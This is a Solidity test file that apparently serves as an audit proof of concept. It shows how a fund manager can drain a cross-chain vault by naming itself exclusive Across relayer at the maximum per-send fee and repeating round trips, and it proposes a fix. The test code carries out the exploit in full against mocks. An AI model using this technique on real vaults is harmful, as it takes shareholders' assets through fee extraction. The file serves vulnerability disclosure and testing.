// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IAcrossSpokePool} from "../../../src/interfaces/external/IAcrossSpokePool.sol";
import {BridgeQuote, TransferKind} from "../../../src/interfaces/FundTypes.sol";
import {TransitMessage} from "../../../src/libraries/TransitMessage.sol";
import {CoreVaultFixture} from "../../unit/core/CoreVaultFixture.sol";

/// @title PoC: the manager is its own exclusive Across relayer at the maximum fee, send after send
/// @notice ATTACK. On every send the manager supplies the whole quote: `outputAmount`, `exclusiveRelayer` and the
///         exclusivity window (FundTypes.sol:77). The vaults only check `inputAmount - outputAmount <= maxBridgeFeeBps`
///         of that one send (CoreVaultLogic.sol:659-662, SpokeCrossChainLib.sol:215-223) and pass the relayer fields to
///         Across untouched (AcrossBridgeAdapter.sol:107-125). Nothing bounds how often the manager sends, and nothing
///         stops it from naming itself exclusive relayer, so no other relayer can compete the fee down. The manager
///         fills its own deposits and keeps `inputAmount - outputAmount` (less Across's LP fee) on every leg, hub to
///         spoke and back, as often as it likes. A round trip needs one accepted report, about 20 minutes.
/// @notice IMPACT. The Mandate's `maxBridgeFeeBps` (QA19) reads as a bound on bridge loss; it is only a bound per
///         send. Ten round trips at the Mandate's 0.5% take 9.5% of the fund, all of it to the manager's relayer;
///         seventy a day are possible. Shareholders see it only as many small `SentToSpoke` events.
/// @notice FIX. Reject a non-zero `exclusiveRelayer` (or allow only a Mandate-listed one), so the fee the fund pays is
///         set by open competition, and bound the bridge fees a fund may pay per period (a Mandate budget in bps of
///         Share Assets per day), since a manager who over-quotes still hands the difference to whoever fills.
/// @dev Real Core Vault on the repository's unit fixture; the spoke's half of each round trip is the reports a Spoke
///      Vault publishes (arrival, send home in flight, empty), and each fill is the mock SpokePool's.
contract BridgeFeeChurnPoC is CoreVaultFixture {
    uint256 internal constant MAX_FEE_BPS = 50;

    function test_POC_managerSelfRelaysAtTheMaximumFeeRoundAfterRound() public {
        _deposit(alice, 100_000e6);
        uint256 assetsBefore = vault.shareAssets();
        uint256 priceBefore = vault.sharePrice();
        assertEq(assetsBefore, 99_750e6);

        uint256 relayerTake;
        uint256 cumulativeReceived;
        for (uint256 round = 1; round <= 10; ++round) {
            // Hub to spoke: everything in Free Idle, the fee at the Mandate's cap, the manager as exclusive relayer
            // for the whole fill window.
            uint256 sent = vault.freeIdle();
            uint256 arrives = sent - sent * MAX_FEE_BPS / 10_000;
            if (round == 1) _expectExclusiveDeposit(sent, arrives);
            vm.prank(manager);
            bytes32 out = vault.sendToSpoke(0, sent, 0, _selfRelayQuote(arrives));
            relayerTake += sent - arrives;

            // The manager fills it on the spoke; the spoke reports the arrival.
            cumulativeReceived += arrives;
            _deliver(_arrived(_spokeReport(arrives, cumulativeReceived), out, arrives));

            // Spoke to hub: the same quote shape on the way back (`sendToHub` takes the same BridgeQuote); the spoke
            // reports it in flight, the manager fills it on the hub, the next report shows the spoke empty.
            uint256 home = arrives - arrives * MAX_FEE_BPS / 10_000;
            bytes32 back = keccak256(abi.encode("send home", round));
            _deliver(_inFlightToHub(_spokeReport(0, cumulativeReceived), back, home));
            pool.fill(
                address(vault), address(usdc), home, TransitMessage.encode(FUND_ID, SPOKE, back, TransferKind.Principal)
            );
            relayerTake += arrives - home;
            _deliver(_spokeReport(0, cumulativeReceived));
        }

        uint256 assetsAfter = vault.shareAssets();
        assertEq(vault.idle(), assetsAfter, "everything is back in Idle: no position was ever opened");
        assertEq(assetsBefore - assetsAfter, relayerTake, "every USDC the fund lost is a fee the relayer kept");
        assertGt(relayerTake, assetsBefore * 950 / 10_000, "9.5% of the fund in ten round trips");
        assertGt(relayerTake, 19 * (assetsBefore * MAX_FEE_BPS / 10_000), "19 times the Mandate's per-send bound");
        assertLt(vault.sharePrice(), priceBefore * 905 / 1000, "Alice's shares lost 9.5% with no market exposure");
    }

    function _selfRelayQuote(uint256 outputAmount) internal view returns (BridgeQuote memory) {
        return BridgeQuote({
            outputAmount: outputAmount,
            quoteTimestamp: uint32(block.timestamp),
            exclusivityDeadline: 21_600,
            exclusiveRelayer: manager
        });
    }

    /// @dev The Across deposit the Core Vault makes: the static head of `depositV3` up to `exclusiveRelayer`.
    function _expectExclusiveDeposit(uint256 sent, uint256 arrives) internal {
        address escrow = vm.computeCreateAddress(address(vault), vm.getNonce(address(vault)));
        vm.expectCall(
            address(pool),
            abi.encodeWithSelector(
                IAcrossSpokePool.depositV3.selector,
                escrow,
                spokeVaultAddress,
                address(usdc),
                address(usdg),
                sent,
                arrives,
                SPOKE,
                manager
            )
        );
    }
}
